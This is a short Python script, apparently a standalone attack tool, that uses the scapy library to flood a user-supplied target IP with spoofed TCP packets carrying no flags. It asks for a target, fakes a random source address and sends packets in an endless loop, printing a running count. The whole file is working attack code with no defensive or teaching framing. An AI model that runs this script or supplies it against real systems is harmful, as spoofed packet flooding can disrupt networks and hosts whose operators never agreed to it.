import scapy.all as scapy

import os

import time

def TCP_Zero():

	clear = os.system('clear')

	print("**************************************")
	print("       TCP_AllFlags_zero_Attack")
	print("**************************************")
	print("please input your attack target's IP")
	target = input("[TCP_AllFlags_zero]#")

	src_ip = scapy.RandIP()

	attack_number = 0

	try:
		while True:
			
			packet = scapy.IP(src=src_ip,dst=target)/scapy.TCP(flags=0)
			scapy.send(packet,verbose=False)
			attack_number += 1
			print("[+]Sent "+str(attack_number)+" packets ")

	except KeyboardInterrupt:
		print("[-]Ctrl + C detected.....")

TCP_Zero()